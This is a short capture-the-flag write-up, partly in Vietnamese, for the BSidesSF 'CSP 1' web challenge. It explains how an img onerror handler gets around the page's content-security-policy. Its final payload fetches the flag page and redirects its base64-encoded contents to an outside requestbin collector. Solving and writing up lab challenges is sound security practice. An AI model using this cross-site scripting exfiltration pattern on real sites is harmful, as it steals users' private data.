CSP 1
=== 

**Category:** Web

**Author:**  itsc0rg1

**Point:** 101 (74 solves)

### Description
```
CSP challenges are back! Can you bypass the CSP to steal the flag?
(flag path: /csp-one-flag)
```
- Site: `https://csp-1-581db2b1.challenges.bsidessf.net`

### Solution
- Ở thử thách này như tiêu đề của tên challange thì là csp (Content-Security-Policy) vì vậy chúng ta cần bypass csp để trigger xss. Và ở thử thách này không có policy filter trong việc chèn lệnh.
```
content-security-policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; script-src-elem 'self'; connect-src *
```
- Nếu sài firefox ở chall này thì chúng ta có thể sử dụng thẻ ```<script>alert(1);</script>``` để trigger xss nhưng ở đây mình sài chrome nên mình kiểm tra từng thẻ thì tìm thấy thẻ `img` để trigger xss -> ```<img src='x' onerror=alert(1)>```
- Tiếp theo mình cần fetch đến `/csp-one-flag` sau đó location nội dung của path đó đến requestbin của mình để lấy flag

#### Payload
```
<img src="x" onerror="fetch('/csp-one-flag').then(x=>x.text()).then(x=>location='http://requestbin.net/r/h505vun2?c='+btoa(x))">
```